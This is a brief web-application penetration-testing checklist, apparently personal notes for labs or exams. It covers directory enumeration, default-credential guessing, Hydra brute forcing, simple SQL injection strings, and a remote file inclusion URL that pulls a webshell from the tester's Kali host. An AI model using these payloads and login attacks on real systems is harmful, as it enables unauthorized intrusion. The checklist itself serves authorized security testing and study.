Web App Playbook

* Feroxbuster
* Curl
* If https, view certificate
* If login page found:
   * Try basic creds (admin/admin, root/root, admin/website name, etc.)
* Try basic SQLI (`asdf' or 1=1--`, `asdf' or 1=1;`, etc.)
* F12
* What software is the server using?
* View page source
   * Look for plaintext creds
   * Software/version enumeration
* Look up default admin pages/creds for any CMS found
* Burp
*   See what how authentication requests work
*   Hydra/intruder
* Try creds found in other enumeration (services on other ports, etc., if available)
* Does the page use php?  Try basic RFI: `http://example.com/index.php?page=http://<kali ip>/<webshell.php>`
   * (use index.php, or if you find a different php file, use that)
* Cewl wordlist of the website and try logging in:
   * `cewl <http://website.com> -m 4 -w wordlist.txt`
